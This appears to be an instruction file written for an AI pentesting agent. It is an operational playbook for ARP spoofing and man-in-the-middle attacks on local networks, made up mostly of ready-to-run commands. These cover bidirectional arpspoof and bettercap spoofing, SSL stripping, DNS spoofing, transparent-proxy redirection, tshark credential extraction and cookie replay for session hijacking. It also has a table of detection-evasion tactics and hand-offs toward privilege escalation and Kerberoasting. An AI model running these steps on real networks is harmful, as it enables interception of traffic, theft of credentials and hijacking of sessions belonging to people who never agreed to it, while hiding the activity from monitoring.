---
name: ARP Spoofing & MITM
description: ARP cache poisoning, man-in-the-middle traffic interception, session hijacking, and traffic sniffing on local networks
---

# ARP Spoofing & MITM

Pull this skill when you have a foothold on a local network segment and need to intercept, modify, or redirect traffic between hosts. Requires being on the same layer-2 broadcast domain as the target(s).

## Tool wiring

| Action | Tool | Notes |
|--------|------|-------|
| ARP spoofing | `kali_shell` — `arpspoof` (dsniff) | Classic bidirectional spoof |
| MITM framework | `kali_shell` — `bettercap` | Full MITM toolkit, caplets, web UI |
| Packet capture | `kali_shell` — `tcpdump`, `tshark` | |
| Connection hijacking | `kali_shell` — `mitmproxy`, `bettercap` | HTTP/HTTPS interception |
| SSL stripping | `kali_shell` — `bettercap`, `sslstrip` | Downgrade HTTPS to HTTP |
| Session hijacking | `kali_shell` — `ferret`, `hamster` | Cookie reuse |
| DNS spoofing | `kali_shell` — `bettercap`, `dnsspoof` | Fake DNS responses |

> **Availability**: tcpdump pre-installed. `arpspoof`, `bettercap`, `tshark` may need `apt install` (dsniff, bettercap, tshark).

## Primer

ARP spoofing works because ARP has no authentication — any host on the network can claim to own any IP address. By sending forged ARP replies, you associate your MAC address with the target's IP (gateway, victim), causing traffic to flow through your machine.

## MITM workflow

### 1. Enable IP forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# Or
sysctl -w net.ipv4.ip_forward=1
```

### 2. Choose your approach

## Option A: arpspoof (classic, simple)

```bash
# Bidirectional spoof: victim <-> gateway through you
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &   # Tell victim you are gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &    # Tell gateway you are victim

# Capture traffic passing through
tcpdump -i eth0 -w capture.pcap host 192.168.1.100

# Stop spoofing and restore ARP tables
kill %1 %2
```

## Option B: bettercap (full-featured)

```bash
# Start bettercap in interactive mode
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# Or with a caplet:
bettercap -caplet http-req-dump

# Common caplets:
#   http-req-dump     — capture HTTP requests
#   https-proxy       — intercept HTTPS (needs cert trust)
#   sniff-passwords   — extract credentials from live traffic
#   dns-spoof         — spoof DNS responses
```

### 3. Redirect traffic for specific protocols

### HTTP credential capture
```bash
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set http.proxy.script /path/to/capture.js; http.proxy on"
```

### HTTPS downgrade (SSLstrip)
```bash
# bettercap does this automatically with https.proxy module
bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set https.proxy.sslstrip true; https.proxy on"
```

### DNS spoofing
```bash
# In bettercap:
# set dns.spoof.all true
# set dns.spoof.address 192.168.1.50  (your IP)
# dns.spoof on

# Or with dnsspoof:
echo "192.168.1.50 *.example.com" > /tmp/dnsspoof.hosts
dnsspoof -i eth0 -f /tmp/dnsspoof.hosts
```

### mitmproxy (advanced HTTP/S manipulation)
```bash
# Transparent proxy mode:
mitmproxy --mode transparent --listen-port 8080

# Then use iptables to redirect HTTP/HTTPS:
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

## Traffic capture and analysis

### Passive sniffing (no ARP spoofing needed)
```bash
# On a switched network, you only see broadcasts and your own traffic
tcpdump -i eth0 -n

# To see all traffic, you MUST ARP spoof first
```

### Targeted capture
```bash
# Capture specific protocol
tcpdump -i eth0 -w http.pcap 'tcp port 80'
tcpdump -i eth0 -w dns.pcap 'udp port 53'
tcpdump -i eth0 -w creds.pcap 'tcp port 80 or tcp port 443'

# Extract HTTP credentials
tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
```

### Bettercap credential sniffing
```bash
bettercap -eval "set arp.spoof.targets 192.168.1.0/24; arp.spoof on; net.sniff on; net.sniff.local true"
```

## Detection avoidance

| Technique | OPSEC note |
|-----------|------------|
| Slow ARP replies | Send spoofed ARP every 30s instead of every second |
| Randomize MAC | Use `macchanger -r` before spoofing |
| Limit targets | Spoof only the gateway instead of full subnet |
| Use passive mode | Only capture, never inject — less detectable |
| Clear iptables | Restore original NAT rules after finishing |

## Validation shape

Evidence of successful MITM should include:
- **Targets**: Victim IP(s) and gateway IP
- **Traffic captured**: Protocols, sample payloads (redacted), credentials found
- **Technique**: ARP spoofing, ICMP redirect, DHCP spoofing
- **Impact**: What data was accessible (unencrypted creds, session tokens, PII)

## False positives

- **ARP table keeps reverting**: Some networks have static ARP entries or dynamic ARP inspection (DAI) on managed switches. Verify with `arp -a` on the victim.
- **Traffic flows but tcpdump sees nothing**: Check interface: you need to be on the same VLAN. Use `ip neigh` to verify the victim's MAC resolved.
- **Victim loses connectivity**: IP forwarding may be off, or iptables is blocking forwarded packets. Check with `sysctl net.ipv4.ip_forward` and `iptables -L`.

## Hand-off

- After capturing credentials: `-> /skill post_exploitation/linux_privesc` or `-> /skill active_directory/kerberoasting`
- After finding HTTP sessions: `-> /skill vulnerabilities/session_hijacking`
- For DNS-based exfiltration: `-> /skill network/dns_attacks`
- If ROP/E IP is internal: `-> /skill network/pivoting_tunneling`

## Pro tips

- **ARP spoofing only works on the same broadcast domain** — you cannot spoof across a router. If the target is on a different subnet, you need to compromise the gateway first.
- **Bettercap's web UI** (`http://127.0.0.1:80`) provides a real-time dashboard of captured traffic, credential tables, and session data — use it for long-running captures.
- **HTTPS interception requires certificate installation** on the victim machine (except when using SSLstrip to downgrade). For red-team assessments, SSLstrip is the pragmatic choice.
- **Session hijacking** with captured cookies works immediately: `curl -b "session=..." http://target/admin` — test cookies as soon as they're captured.
